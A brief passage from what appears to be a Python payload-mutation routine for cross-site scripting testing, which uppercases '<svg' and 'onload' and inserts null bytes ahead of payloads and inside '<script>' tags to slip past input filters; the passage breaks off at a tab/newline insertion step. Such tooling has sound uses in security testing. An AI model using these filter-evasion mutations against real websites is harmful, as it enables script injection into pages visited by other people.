    if "<svg" in payload.lower():
        mutations.append(payload.replace("<svg", "<SVG").replace("onload", "ONLOAD"))
    
    # 5. Null byte injection
    mutations.append(f"%00{payload}")
    mutations.append(payload.replace("<script>", "<scri%00pt>"))
    
    # 6. Tab/newline insertion
